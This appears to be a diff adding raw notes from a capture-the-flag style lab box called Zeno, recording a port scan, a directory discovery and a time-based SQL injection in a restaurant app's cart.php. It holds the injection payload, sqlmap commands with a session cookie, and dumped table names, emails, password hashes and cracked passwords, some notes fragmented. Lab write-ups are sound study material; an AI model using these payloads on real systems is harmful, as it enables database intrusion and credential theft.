@@ -1,0 +1,67 @@
+Zeno:
+22 (OpenSSH 7.4)
+12340 (Apache 2.4.6)
+at first says 404
+gobuster reveals /rms
+holy crap its an entire restaurant managing service website
+rough feeling suggests there may be a way to do a SQL injection
+way things are layed out in tables, and also the use of the word “ID”, not sure but gives me a feeling.
+AHAHAH
+After so much testing, I finally found a section of the website vulnerable to SQLI!!!
+http://10.10.179.29:12340/rms/cart.php?id=(VULN)
+id=24' AND (SELECT 1709 FROM (SELECT(SLEEP(5)))OEnQ) AND 'REuM'='REuM
+SQLmap
+I used sqlmap to confirm my initial suspicions
+sqlmap -u http://10.10.179.29:12340/rms/cart.php?id=24 --cookie=”P…..” --dump
+sqlmap --cookie="PHPSESSID=avp36r3hdfcec7suk7tuaulvv2" -u http://10.10.61.167:12340/rms/cart-exec.php?id=24 -T members --dump
+
+
+It is a time based injection, so it takes a bit of time to fully dump.
+Obtained Information:
+OS: linux CentOS 7
+DBMS: MySQL > 5.0.12
+tables:
+billing_details
+cart_details
+categories
+currencies
+food_details
+members
+member_id
+firstname
+lastname
+login
+edward@zeno.com
+jsmith@sample.com
+omolewastephen@gmail.com
+m@g.com
+passwd
+1254737c076cf867dc53d60a0364f38e
+cracked: jsmith123
+202cb962ac59075b964b07152d234b70
+123
+6f72ea079fd65aff33a67a3f3618b89c
+fuckyooh21..*7¡Vamos!
+81dc9bdb52d04dc20036db8313ed055
+1234
+question_id
+messa
+order_details
+part
+pizza_admin
+admin:1234
+polls
+quantities
+fragmented tables
+halls
+ges
+_details
+There are 20 total tables, but I had to leave so I couldn’t finish the scan.
+Web users
+edward@zeno.com:fuckyooh21..*7¡Vamos!
+
+
+jsmith@sample.com:jsmith123
+john has a sample message from “administrator”
+m@g.com:123
+I made this account and dumped my own password
